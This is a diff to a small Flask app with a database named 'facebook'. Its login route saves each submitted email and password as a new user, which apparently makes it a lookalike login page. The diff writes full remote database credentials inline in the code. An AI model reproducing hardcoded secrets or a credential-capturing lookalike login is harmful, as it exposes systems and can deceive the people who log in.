@@ -1,14 +1,17 @@
 from flask import Flask, request, redirect, render_template
 from flask_sqlalchemy import SQLAlchemy
+from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:@localhost/facebook'
+
+# Update the database URI with the provided credentials
+app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 db = SQLAlchemy(app)
 
 class User(db.Model):
-    __tablename__ = 'login'  # Specify the table name
+    __tablename__ = 'users'  # Specify the table name
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(80), unique=True, nullable=False)
     password = db.Column(db.String(120), nullable=False)
@@ -23,9 +26,11 @@ def login():
         username = request.form['email']
         password = request.form['password']
         
+        # Hash the password
+        hashed_password = generate_password_hash(password)
         
         # Create a new User instance
-        new_user = User(username=username, password=password)
+        new_user = User(username=username, password=hashed_password)
         
         # Add the new user to the session
         db.session.add(new_user)
